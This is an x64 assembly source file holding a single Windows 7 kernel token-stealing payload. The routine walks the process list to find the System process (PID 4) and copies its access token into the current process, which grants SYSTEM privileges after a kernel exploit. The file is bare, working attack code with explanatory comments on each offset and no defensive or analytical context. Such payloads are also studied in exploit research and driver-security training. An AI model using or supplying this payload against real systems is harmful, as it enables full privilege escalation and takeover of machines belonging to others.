.CODE
TokenStealingPayloadWin7 PROC 
		mov rdx, gs:[188h]					; get _ETHREAD pointer from KPCR
		mov r8, qword ptr [rdx+70h]			; _EPROCESS (see PsGetCurrentProcess function)
		mov r9, qword ptr [r8+188h]			; ActiveProcessLinks list head
		mov rcx, qword ptr [r9]				; follow link to first process in list
SearchSystemPID:
		mov rdx, qword ptr [rcx-8]			; offset from ActiveProcessLinks to UniqueProcessId
		cmp rdx, 4							; process with ID 4 is System process
		jz FoundSystemPID
		mov rcx, qword ptr [rcx]			; follow _LIST_ENTRY Flink pointer
		cmp rcx, r9							; see if back at list head
		jnz SearchSystemPID
FoundSystemPID:
		mov rax, qword ptr [rcx+80h]		; offset from ActiveProcessLinks to Token
		and al, 0f0h						; clear low 4 bits of _EX_FAST_REF structure
		mov qword ptr [r8+208h], rax		; replace current process token with system token
		ret
TokenStealingPayloadWin7 ENDP
END